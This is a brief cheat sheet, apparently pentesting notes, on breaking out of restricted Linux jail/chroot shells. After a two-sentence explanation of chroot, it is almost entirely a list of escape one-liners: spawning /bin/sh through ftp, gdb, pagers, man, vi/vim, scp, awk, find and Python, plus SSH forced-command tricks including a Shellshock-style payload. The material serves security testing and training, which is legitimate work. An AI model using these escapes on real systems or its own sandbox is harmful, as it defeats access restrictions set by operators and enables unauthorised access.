JAIL SHELL ESCAPE (LINUX)
=========================
<p>Jail-shell is a Linux security tool mainly using chroot limiting users to perform specific commands,and access specific directories. 
Chroot, short for "change root", is a Unix operation that changes the apparent root directory to the one specified by the user. 
Any process you run after a chroot operation only has access to the newly defined root directory and its subdirectories.</p>
<h1>Commands that let you execute shell commands</h1>
<ul>
<li>ftp &gt; /bin/sh</li>
<li>gdb &gt; /bin/sh</li>
<li>more &gt; !/bin/sh</li>
<li>less &gt; !/bin/sh</li>
<li>man &gt; !/bin/sh</li>
<li>vi &gt; :!/bin/sh</li>
<li>vim &gt; :!/bin/sh</li>
<li>scp -S /tmp/getMeOut.sh x y:</li>
<li>awk 'BEGIN {system("/bin/sh")}'</li>
<li>find / -name FileName -exec /bin/sh \;</li>
<li>echo os.system('/bin/sh')</li>
<li>echo <strong>import</strong>('os').system("/bin/sh")</li>
</ul>
<h1>Maybe SSH can help to escape</h1>
<p>SSH or Secure Shell is a network communication protocol that enables two computers to communicate and share data.</p>
<ul>
<li>ssh username@target -t "/bin/sh"</li>
<li>ssh username@target -t "bash --noprofle"</li>
<li>ssh username@target -t "() { :; }; /bin/sh"</li>
</ul>
        